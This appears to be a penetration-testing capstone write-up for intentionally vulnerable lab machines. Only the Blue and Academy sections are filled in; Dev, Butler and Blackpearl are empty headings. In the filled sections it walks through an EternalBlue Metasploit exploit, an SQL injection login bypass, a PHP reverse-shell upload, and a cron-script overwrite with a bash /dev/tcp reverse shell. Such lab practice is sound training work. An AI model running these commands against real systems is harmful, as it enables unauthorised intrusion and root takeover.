# Capstone

This consists of some intentionally vulnerable machines which would be exploited using our Kali Linux machine:

  1. [Blue](#blue)
  2. [Academy](#academy)
  3. [Dev](#dev)
  4. [Butler](#butler)
  5. [Blackpearl](#blackpearl)

## Blue

---

* Given, the IP address of the vulnerable Windows Vista machine is 10.0.2.8. We can also confirm this once by using ```netdiscover```:

```shell
netdiscover -r 10.0.2.0/24
#shows 10.0.2.8 (Blue)

nmap -T4 -p 1-1000 -A 10.0.2.8
#using nmap to scan machine
#scanning only first 1000 ports as it would take much too time to scan all ports
```

* From the nmap scan, we get the following results:

```shell
135/tcp - open - msrpc - Microsoft Windows RPC
139/tcp - open - netbios-ssn - Microsoft Windows netbios-ssn
445/tcp - open - microsoft-ds - Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (WORKGROUP)
MAC Address - 08:00:27:2A:95:91
Running - Microsoft Windows 7|2008|8.1

Host script results:

smb2-security-mode - 2.1 - Message signing enabled but not required
nbstat - NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: unknown, NetBIOS MAC: 08:00:27:2a:95:91 (Oracle VirtualBox virtual NIC)
smb-security-mode - account_used: guest, authentication_level: user, challenge_response: supported, message_signing: disabled
OS - Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
OS CPE - cpe:/o:microsoft:windows_7::sp1
Computer name - WIN-845Q99OO4PP
NetBIOS computer name - WIN-845Q99OO4PP\x00
```

* Based on the results, we can attempt to enumerate based on the version of operating system, or if that does not work, we can go for the open ports and services given to us.

* Searching for exploits for the version of Microsoft Windows given to us, we get an exploit called 'Eternal Blue', which is a SMB remote code execution vulnerability.

* This exploit module is given as exploit/windows/smb/ms17_010_eternalblue, so we can run it using Metasploit framework:

```shell
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
#by default, payload is windows/x64/meterpreter/reverse_tcp

options

set RHOSTS 10.0.2.8

show targets

exploit
```

* Hence, the 'Eternal Blue' exploit worked and we got access to Blue.

## Academy

---

* After switching on the machine, we can start scanning from Kali Linux to discover the machine and do further operations:

```shell
netdiscover -r 10.0.2.0/24
#shows machine with address 10.0.2.15, IP of Academy

ping 10.0.2.15
#ping works as well, checking if machine is up

nmap -T4 -p- -A 10.0.2.15
#nmap to scan all ports
```

* From the nmap scan, we get the following results:

```shell
21/tcp - open - ftp - vsftpd 3.0.3
ftp-anon: Anonymous FTP login allowed (FTP code 230)
_-rw-r--r-- - 1 - 1000 - 1000 - 776 - May 30 2021 - note.txt
FTP server status - Connected to ::ffff:10.0.2.7 - Logged in as ftp - TYPE: ASCII
22/tcp - open - ssh - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
ssh-hostkey: 
  2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
  256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp - open - http - Apache httpd 2.4.38 (Debian)
http-title: Apache2 Debian Default Page: It works
http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:E7:E8:11 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

* We can begin enumeration, starting with HTTP, and parallely enumerate other ports and services such as FTP:

  * We visit the link <http://10.0.2.15> for port 80/tcp. It gives us a generic Apache 2 Default Debian Page.

  * Information disclosure - Apache manual link given in <http://10.0.2.15> leads to 404 page with Apache version 2.4.38.

  * We can proceed to use a web application scanner here:

  ```shell
  nikto -h 10.0.2.15 #lists all vuln in website
  #Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
  #Uncommon header 'x-ob_mode' found, with contents: 1
  #Cookie goto and back created without the httponly flag
  #found /phypmyadmin/ChangeLog, /icons/README, /phpmyadmin/, /phpmyadmin/README

  dirbuster #tool for directory scanning, this lists more directories in website
  #the two major directories we get are /academy and /phpmyadmin
  ```

  * If we visit <http://10.0.2.15/academy>, we get a login portal. Attempting SQL injection by entering ```' or 1=1#```, we manage to log in as 'Rum Ham'.

  * Exploring the website further, we get more details about the user.

  * Information disclosure - In <http://10.0.2.15/academy/my-profile.php>, we get info; Student Name - Rum Ham; Student Reg No - 10201321; Pincode - 777777; CGPA - 7.60.

  * The Profile page also contains an option to upload a profile pic, so we can attempt to upload a PHP reverse shell here to see if it works.

  * Using any PHP reverse shell, such as the one given in <https://github.com/pentestmonkey/php-reverse-shell> we can proceed:

  ```shell
  vim academyshell.php #create file and open it
  #paste shell contents and edit the IP address of machine
  #save file and exit  

  nc -nvlp 1234 #netcat to listen at port 1234 (given in shell)

  #now we can upload the reverse shell in the website
  #this gives us access to the machine

  whoami
  #www-data
  ```

  * As we are not root here, we will have to use privilege escalation.

  * We can use a script called linPEAS on <https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>, which checks vulnerabilities related to privilege escalation:

  ```shell
  #in a new terminal tab
  mkdir transfers #directory for separating files

  cd transfers/

  vim linpeas.sh #copy script content, save file

  #now we can start our web server here, so that we can get back to www-data on Academy and download this script
  python3 -m http.server 80 #hosts web server
  ```

  * Getting back to the Academy machine access through www-data:

  ```shell
  cd /tmp #get to tmp directory to download script

  wget http://10.0.2.7/linpeas.sh #downloads the script

  chmod +x linpeas.sh #give executable permissions

  ./linpeas.sh #executes the script, we can look through the output
  #/home/grimmie/backup.sh is highlighted in red/yellow, so it could be important
  #gives mysql_password = "My_V3ryS3cur3_P4ss"

  cat /etc/passwd
  #shows that the user "grimmie" is administrator
  #on trying user "grimmie" and password "My_V3ryS3cur3_P4ss" on phpmyadmin, it works and we get access

  cat /home/grimmie/backup.sh
  #shows a script which contains info about backup files; the script is executed at a certain period
  
  #we can also attempt to login into ssh, as it was mentioned that the same password was being used everywhere
  #so in a new tab

  ssh grimmie@10.0.2.15
  #we get access
  ```

* Enumerating FTP on port 21:

  * We use ftp to connect to Academy machine:

  ```shell
  ftp 10.0.2.15
  #use username Anonymous and password anon

  ls
  #shows note.txt

  get note.txt

  exit
  #exit ftp, back in our system now

  cat note.txt
  #gives details related to the website portal on <http://10.10.2.15/academy>, including login details
  ```

* Now, as we have access to the machine as 'grimmie', we can use one-liner reverse shells and save it in the script ```backup.sh```, so that when it is executed again we get root access:

  * We can use any one-liner reverse shells from Google:

  ```shell
  #in our Kali Linux terminal
  nc -nvlp 8081 #listening on port 8081 for reverse shell to work

  #in the Academy machine through 'grimmie'
  nano backup.sh
  #edit the script and remove all lines and paste the one-liner; make sure to edit IP address and port
  #bash -i >& /dev/tcp/10.0.2.7/8081 0>&1
  ```

  * This method works and we get access as root on Academy. We can view the flag.txt as well.

## Dev

---

## Butler

---

## Blackpearl

---
